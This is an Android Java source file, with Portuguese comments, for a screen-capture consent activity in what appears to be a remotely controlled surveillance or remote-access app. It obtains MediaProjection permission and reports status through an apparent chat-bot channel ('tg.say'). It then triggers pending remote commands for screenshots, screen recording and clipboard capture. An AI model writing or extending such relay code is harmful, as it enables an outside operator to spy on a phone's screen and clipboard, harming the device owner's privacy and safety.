package br.svc.relay;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.TextView;

/** FLUXO CANONICO (padrao Google): tudo na main thread, janela VISIVEL o tempo todo:
 *  1. INICIAR respondido -> 2. sobe CaptureService (FGS tipo mediaProjection)
 *  3. espera ele ficar foreground  4. getMediaProjection  5. so entao finish. */
public class ShotConsentActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            TextView tv = new TextView(this);
            tv.setText("Autorizando captura de tela…");
            tv.setTextSize(16);
            tv.setTextColor(Color.DKGRAY);
            tv.setGravity(Gravity.CENTER);
            setContentView(tv);
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
        } catch (Throwable t) {
            if (BridgeHolder.tg != null) BridgeHolder.tg.say("consent: CRASH onCreate: " + t);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int req, int resultCode, Intent data) {
        super.onActivityResult(req, resultCode, data);
        try {
            if (BridgeHolder.tg != null)
                BridgeHolder.tg.say("shot: consentimento respondido (code " + resultCode + ")");
            if (req == 1001 && resultCode == RESULT_OK && data != null) {
                // 2. FGS tipado sobe AGORA, com a janela visivel
                try { startForegroundService(new Intent(this, CaptureService.class)); }
                catch (Throwable t) { BridgeHolder.tg.say("consent: FGS falhou: " + t); }
                // 3. espera o foreground dele (janela ainda visivel = contexto forte)
                long limite = System.currentTimeMillis() + 3500;
                while (!CaptureService.noAr && System.currentTimeMillis() < limite) {
                    try { Thread.sleep(150); } catch (InterruptedException ignored) { }
                }
                if (!CaptureService.noAr) BridgeHolder.tg.say("consent: CaptureService nao ficou no ar");
                // 4. projecao ENQUANTO VISIVEL
                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                MediaProjection mp = mpm.getMediaProjection(resultCode, data);
                if (mp == null) {
                    BridgeHolder.tg.say("shot: projecao nula");
                } else {
                    mp.registerCallback(new MediaProjection.Callback() {
                        @Override public void onStop() {
                            BridgeHolder.projection = null;
                            if (BridgeHolder.tg != null)
                                BridgeHolder.tg.say("projecao: sessao ENCERRADA PELO SISTEMA");
                        }
                    }, null);
                    BridgeHolder.projection = mp;
                    BridgeHolder.tg.say("shot: captura autorizada! mande 'shot' pra fotografar");
                }
            } else if (req == 1001) {
                if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: consentimento negado/cancelado");
            }
        } catch (Throwable t) {
            if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: erro projecao: " + t);
        }
        // 5. SOME SO NO FIM
        finish();
        // disparos pendentes (agora em thread simples, so o dispatch)
        if (BridgeHolder.projection != null) {
            if (BridgeHolder.shotPendente) { BridgeHolder.shotPendente = false; RelayService.dispararCaptura(); }
            if (BridgeHolder.recPendente > 0) { int s = BridgeHolder.recPendente; BridgeHolder.recPendente = 0; RelayService.dispararRec(s); }
            if (BridgeHolder.clipPendente) { BridgeHolder.clipPendente = false; RelayService.armarClip(); }
        }
    }
}
